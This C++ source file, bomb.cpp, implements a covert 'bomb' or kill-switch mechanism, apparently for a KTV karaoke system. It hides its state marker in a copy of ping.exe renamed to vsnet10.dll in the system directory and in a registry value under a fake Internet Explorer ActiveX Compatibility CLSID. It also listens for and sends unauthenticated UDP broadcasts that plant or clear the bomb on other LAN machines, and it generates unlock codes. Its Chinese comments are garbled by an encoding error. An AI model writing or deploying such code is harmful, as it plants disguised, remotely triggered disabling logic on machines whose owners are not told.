// bomb.cpp
//

#include "stdAfx.h"
#include "bomb.h"

#include <winsock2.h>
#include <shellapi.h>
#include <shlwapi.h>
#include <ctime>
#include <cstdio>
#include <cstdlib>
#include <cassert>

#define DEBUG_BOMB

//////////////////////////////////////////////////////////////////////////
// ������س���

// ����д���ļ���λ�ã�д���־����ռ6���ֽڣ�
const int g_write_offset = 0x1813;

// ը�����͸ı�ֵ
const unsigned int g_bomb_type_change_value = 0x1E52;

// ���׼����˿ں�
const unsigned short g_bomb_port = 13947;

//////////////////////////////////////////////////////////////////////////
// ����ʵ��

// ���캯��
bomb::bomb()
{
	TCHAR system_dir[256];
	TCHAR ping_path[256];
	DWORD threadId=0;

	memset(m_bomb_file_path,0x0,sizeof(m_bomb_file_path));
	memset(system_dir,0x0,sizeof(system_dir));
	memset(ping_path,0x0,sizeof(ping_path));
	m_bomb_type = BOMB_NONE;
	
	GetSystemDirectory(system_dir,sizeof(system_dir));
	swprintf(m_bomb_file_path,L"%s\\vsnet10.dll",system_dir);
	//��ping.exe�ļ�����һ��
	swprintf(ping_path,L"%s\\ping.exe",system_dir);
	CopyFile(ping_path,m_bomb_file_path,TRUE);

	//���������߳�
	m_thread_run = true;
	HANDLE hThread = CreateThread(NULL, 0, start_thread, this, 0, &threadId);
	if (hThread)
	{
		CloseHandle(hThread);
		hThread = NULL;
	}
	//�����߳̽������¼�
	m_thread_event_handle = CreateEvent(NULL,TRUE,FALSE,NULL);

	//����ը��
	m_bomb_type = check_bomb();
	if (BOMB_NONE!=m_bomb_type)
	{
		//�㲥ը��
		broadcast(m_bomb_type);
	}
}

bomb::~bomb()
{
	m_thread_run = false;
	WaitForSingleObject(m_thread_event_handle,INFINITE);
}

// �����
bool bomb::embed_bomb(int bomb_type,bool allow_broadcast)
{
	bool result=false;

	if (BOMB_SONG==bomb_type)
	{
		//ͣ����ը��
		//д�뵽�ļ���
		result = write_file_bomb(bomb_type);
		//д�뵽ע���
		set_reg_bomb(2, bomb_type);
		if (allow_broadcast)
		{
			//����ը��Ҫ�㲥��ȥ
			broadcast(bomb_type);
			broadcast(bomb_type);
		}	
	}
	else if (BOMB_STOP_DOG==bomb_type)
	{
		//ͣ��ը��
	}
	
	return true;
}

// �ҵ���
int bomb::check_bomb(void)
{
	int reg_bomb_type=0;
	int read_bomb_type=0;

	//������
	//�ȴ�ע����в�ѯ
	reg_bomb_type = set_reg_bomb(1,0);
	if ((BOMB_SONG==reg_bomb_type) || (BOMB_STOP_DOG==reg_bomb_type))
	{
		//ע����д����ڴ��ļ��в�ѯ
		if (PathFileExists(m_bomb_file_path))
		{
			FILE* fp = _wfopen(m_bomb_file_path, L"rb");
			fseek(fp, g_write_offset, SEEK_SET);
			fread(&read_bomb_type, 1, sizeof(read_bomb_type), fp);
			//�õ�ը������
			read_bomb_type -= g_bomb_type_change_value;
			if (read_bomb_type==reg_bomb_type)
			{
				return reg_bomb_type;
			}
		}
	}
    
	//û��ը��
	return BOMB_NONE;
}

bool bomb::bomb_out(void)
{
	try
	{
		bool result=false;
		
		//��¼��ը������
		m_bomb_type = BOMB_NONE;

		//�Ƴ��ļ�ը��
		result = write_file_bomb(BOMB_NONE);
		//�Ƴ�ע���ը��
		set_reg_bomb(3,BOMB_NONE);

		//�Ƴ�Ҫ�㲥��ȥ
		broadcast(BOMB_NONE);
		broadcast(BOMB_NONE);

		return result;
	}
	catch (...)
	{
		
	}
	return false;
}

int bomb::set_reg_bomb(int operate, int bomb_type)
{
	// �޸�ע�����Ϣ
	HKEY hKey;
	DWORD value=0;
	DWORD dType = REG_DWORD;
	DWORD dSize = 80;
	int flag=BOMB_NONE;
	TCHAR sub_key[256];
	TCHAR reg_name[256];

	memset(sub_key,0x0,sizeof(sub_key));
	memset(reg_name,0x0,sizeof(reg_name));

	_tcscpy(sub_key,L"SOFTWARE\\Microsoft\\Internet Explorer\\ActiveX Compatibility\\{969C092D-7815-13CF-8D75-F4475354145F}");
	_tcscpy(reg_name,L"Compatibility Flags");

	if (1==operate)
	{
		if (RegOpenKeyEx(HKEY_LOCAL_MACHINE,sub_key,0, KEY_ALL_ACCESS, &hKey) == ERROR_SUCCESS)
		{
			//��ȡը��
			if (RegQueryValueEx(hKey, reg_name, NULL, &dType, (LPBYTE)&value, &dSize) == ERROR_SUCCESS)
			{
				flag = value-g_bomb_type_change_value;
			}
            RegCloseKey(hKey);
		}
    } 
	else if(2==operate)
	{
		//д��ը��
		if (RegCreateKeyEx(HKEY_LOCAL_MACHINE,sub_key,0,NULL,REG_OPTION_NON_VOLATILE,KEY_ALL_ACCESS,NULL,&hKey,NULL)==ERROR_SUCCESS)
		{
			value = bomb_type+g_bomb_type_change_value;

			if (RegSetValueEx(hKey, reg_name, 0, REG_DWORD, (BYTE*)&value, 4) == ERROR_SUCCESS)
			{
				flag = bomb_type;
			}
			RegCloseKey(hKey);
		}
	}
	else
	{
		//���ը��
		if (RegOpenKeyEx(HKEY_LOCAL_MACHINE,sub_key,0, KEY_WRITE, &hKey) == ERROR_SUCCESS)
		{
			value = bomb_type+g_bomb_type_change_value;

			//�ı�ֵ
			RegSetValueEx(hKey, reg_name, 0, REG_DWORD, (BYTE*)&value, 4);
            //ɾ��
			RegDeleteValue(hKey,reg_name);
			//�ر�
			RegCloseKey(hKey);
			//����ը������
			flag = BOMB_NONE;
		}
	}

	return flag;	
}

bool bomb::write_file_bomb(int bomb_type)
{
	try
	{
		unsigned int write_bomb_type = 0;

		// �����
		// �޸��ļ�����
		FILE* fp = _wfopen(m_bomb_file_path, L"r+");
		if (NULL==fp)
		{
			return false;
		}
		fseek(fp, g_write_offset, SEEK_SET);
		write_bomb_type = g_bomb_type_change_value + bomb_type;
		fwrite(&write_bomb_type, 1, sizeof(write_bomb_type), fp);		// д���־
		fclose(fp);
		fp=NULL;

		return true;
	}
	catch (...)
	{
		
	}
	return false;
}

void bomb::broadcast(int bomb_type)
{
	try
	{
		char bomb_type_string[64];
		BOOL fBroadcast = TRUE;
		int timeout = 60000;
		
		memset(bomb_type_string,0x0,sizeof(bomb_type_string));
		SOCKET sockfd = socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP);
		if (sockfd < 0)
		{
			return;
		}

		//���ù㲥
		::setsockopt(sockfd,SOL_SOCKET,SO_BROADCAST,(CHAR *)&fBroadcast,sizeof (BOOL));
		//���ý��ܳ�ʱ
		::setsockopt(sockfd,SOL_SOCKET,SO_SNDTIMEO,(char *)&timeout,sizeof(timeout));
		//off TIME_WAIT
		struct linger zeroLinger;	
		zeroLinger.l_onoff = 1;	
		zeroLinger.l_linger = 5;
		setsockopt(sockfd,SOL_SOCKET,SO_LINGER,(const char *)&zeroLinger	,sizeof(zeroLinger));

		// Ҳ�������������bind������һ�����ص�ַ
		// ����ϵͳ�����Զ�����

		//��д�㲥��ַ
		SOCKADDR_IN addr;
		addr.sin_family = AF_INET;
		addr.sin_addr.s_addr =  INADDR_BROADCAST;
		addr.sin_port = ntohs(g_bomb_port);
		sprintf(bomb_type_string, "zlgshinektv8message%d", bomb_type);
		//���ͳ�ȥ
		sendto(sockfd, bomb_type_string, 20, 0, (sockaddr*)&addr, sizeof(addr));
		closesocket(sockfd);
		sockfd=0;
	}
	catch (...)
	{
		
	}
	return;
}

// �߳�
DWORD WINAPI bomb::start_thread(void* pParam)
{
	bomb* pThis = reinterpret_cast<bomb*>(pParam);

	pThis->bomb_thread();

	return 0;
}

#define SLEEP_FOR Sleep(1000)

void bomb::bomb_thread(void)
{
	try
	{
		char buffer[256];
		 fd_set bomb_socket_set;
		 timeval overtime;
		 overtime.tv_sec = 0;
		 overtime.tv_usec = 100000;
		 int bomb_type=0;

		 FD_ZERO(&bomb_socket_set);
		
		SOCKET sockfd = socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP);
		if (sockfd < 0) 
		{
			SetEvent(m_thread_event_handle);
			return ;
		}
		sockaddr_in addr;
		addr.sin_family = AF_INET;
		addr.sin_addr.s_addr = htonl(INADDR_ANY);
		addr.sin_port = ntohs(g_bomb_port);
		if (SOCKET_ERROR==bind(sockfd, (struct sockaddr*)&addr, sizeof(sockaddr_in)))
		{
			SetEvent(m_thread_event_handle);
			return ;
		}

		FD_SET(sockfd,&bomb_socket_set);
		while (m_thread_run)
		{
			SLEEP_FOR;

			//��fdSocket���ϵ�һ������fdRead���ݸ�select������
			// �����¼�����ʱ��select�����Ƴ�fdRead������û��δ��I/O�������׽��־����Ȼ�󷵻�
			fd_set fdRead = bomb_socket_set;
			if(::select(0,&fdRead,NULL,NULL,&overtime)>0)
			{
				//ͨ����ԭ��fdSocket������select�������fdRead���ϱȽϣ�
				// ȷ��������Щ�׽�����δ��I/O������һ��������ЩI/O��
// 				for(int i=0; i<(int)bomb_socket_set.fd_count; i++)
// 				{
// 					if (FD_ISSET(bomb_socket_set.fd_array[i],&fdRead))
// 					{
// 						if (bomb_socket_set.fd_array[i]==sockfd)
// 						{
// 						}
// 					}
// 				}
				//���ھ�һ��socket�����Բ���������ж�
				memset(buffer,0x0,sizeof(buffer));
				int len = sizeof(sockaddr_in);
				int n = recvfrom(sockfd, buffer, sizeof(buffer), 0, (sockaddr*)&addr, &len);

				if (n == 20)
				{
					if (strncmp(buffer, "zlgshinektv8message", 19) == 0)
					{
						sscanf(&buffer[19],"%d",&bomb_type);
						if (BOMB_SONG==bomb_type)
						{
							//��װը��
							embed_bomb(bomb_type,false);
						}
						else if (BOMB_NONE==bomb_type)
						{
							//�Ƴ�ը��
							bomb_out();
						}
						break;
					}
				}
			}//end if
		}
		closesocket(sockfd);
		sockfd = 0;
		SetEvent(m_thread_event_handle);
	}
	catch (...)
	{
	}
	SetEvent(m_thread_event_handle);
	return;
}

int bomb::get_bomb_type(void)
{
	return m_bomb_type;
}

bool bomb::make_authentication_code(TCHAR *code)
{
	try
	{
		int number=0;
		TCHAR temp_number[8];

		for (int i=0;i<16;i++)
		{
			number = rand()/(RAND_MAX/10+1);
			memset(temp_number,0x0,sizeof(temp_number));
			swprintf(temp_number,L"%d",number);
            code[i]=temp_number[0];
		}
		
		return true;
	}
	catch (...)
	{
		
	}
	return false;
}

bool bomb::make_bomb_code(TCHAR *authentication_code,TCHAR *code1,TCHAR *code2)
{
	try
	{
		int first_suffix=0;
		int second_suffix=0;
		int number=0;
		TCHAR temp_number[8];

		//����֤������32λ��ը��
		for (int i=0;i<18;i++)
		{
			//��֤��16λ
			first_suffix = (i*3+7)%16;
			second_suffix = (i*7+5)%16;

			number = (authentication_code[first_suffix]+authentication_code[second_suffix])%10;
			memset(temp_number,0x0,sizeof(temp_number));
			swprintf(temp_number,L"%d",number);
			code1[i]=temp_number[0];
		}
		for (int i=18;i<32;i++)
		{
			//��֤��16λ
			first_suffix = (i*3+5)%16;
			second_suffix = (i*7+1)%16;

			number = (authentication_code[first_suffix]+authentication_code[second_suffix])%10;
			memset(temp_number,0x0,sizeof(temp_number));
			swprintf(temp_number,L"%d",number);
			code2[i-18]=temp_number[0];
		}

		return true;
	}
	catch (...)
	{

	}
	return false;
}